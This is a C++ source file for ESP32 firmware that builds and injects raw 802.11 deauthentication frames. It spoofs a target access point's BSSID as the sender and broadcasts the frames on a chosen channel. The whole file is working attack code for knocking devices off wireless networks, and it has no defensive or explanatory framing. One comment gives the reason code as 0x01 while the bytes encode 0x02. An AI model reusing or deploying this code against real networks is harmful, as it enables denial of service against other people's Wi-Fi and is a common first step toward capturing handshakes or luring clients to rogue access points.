#include "wifi.h"

namespace Wifi {

// Default deauth frame (802.11 management, subtype 0xC).
// Addr1 = broadcast, Addr2/Addr3 filled per-target, reason code 0x01.
static const uint8_t deauth_frame_default[] = {
	0xc0, 0x00, 0x3a, 0x01,             // Frame Control + Duration
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Addr1: broadcast
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr2: source (set per-target)
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr3: BSSID (set per-target)
	0xf0, 0xff, 0x02, 0x00              // Seq ctl + reason code
};

static uint8_t deauth_frame[sizeof(deauth_frame_default)];

void deauthResetFrame() {
	memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
}

void deauthSendRawFrame(const uint8_t *frame_buffer, int size) {
	ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}

void deauthSendFrame(const uint8_t* bssid, int chan) {
	esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
	delay(50);
	memcpy(&deauth_frame[10], bssid, 6); // Addr2 (source, spoofed as AP)
	memcpy(&deauth_frame[16], bssid, 6); // Addr3 (BSSID)
	deauthSendRawFrame(deauth_frame, sizeof(deauth_frame_default));
}

}